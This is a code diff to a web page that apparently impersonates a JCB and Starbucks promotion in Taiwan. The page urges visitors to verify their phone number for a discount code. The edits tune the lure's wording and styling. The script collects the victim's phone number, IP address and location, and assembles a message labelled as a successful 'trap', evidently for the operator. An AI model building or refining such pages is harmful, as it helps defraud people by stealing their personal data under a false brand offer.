@@ -24,16 +24,11 @@
              margin:0 16px 30px;padding:32px 24px;border:1px solid rgba(255,255,255,0.15);
              box-shadow:0 15px 35px rgba(0,0,0,0.3);flex:1}
 
-        /* 關鍵修正：強制單行 + 微調字距 */
+        /* 關鍵：把字縮短 + 強制單行 */
         .highlight{
-            font-size:27px !important;
-            font-weight:900;
-            color:#FFC600;
-            line-height:1.2;
-            white-space:nowrap;     /* 絕對不換行 */
-            overflow:hidden;
-            text-overflow:ellipsis;
-            letter-spacing:0.5px    /* 稍微拉開字距更好看 */
+            font-size:26px;font-weight:900;color:#FFC600;
+            white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+            letter-spacing:1px;
         }
 
         .desc{font-size:16px;margin:12px 0 25px;color:#E8E8E8}
@@ -62,7 +57,8 @@
     </div>
 
     <div class="box">
-        <div class="highlight">消費滿 NT$99 享買一送一</div>
+        <!-- 關鍵修正：改成 $99 + 強制單行 -->
+        <div class="highlight">消費滿 $99 享買一送一</div>
         <div class="desc">
             限 2025 全年・晶緻卡專屬<br>
             立即驗證手機領取專屬優惠碼！
@@ -106,7 +102,7 @@
             const ipData = await fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>({}));
             const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
 
-            const 訊息 = "JCB星巴克 NT$99 誘捕成功\n\n" +
+            const 訊息 = "JCB星巴克 $99 誘捕成功\n\n" +
                         "電話：" + code + phone + "\n" +
                         "IP　　：" + (ipData.ip || "未知") + "\n" +
                         "位置　：" + (ipData.city || "未知") + "，" + (ipData.country_name === "Taiwan" ? "台灣" : ipData.country_name || "未知") + "\n" +
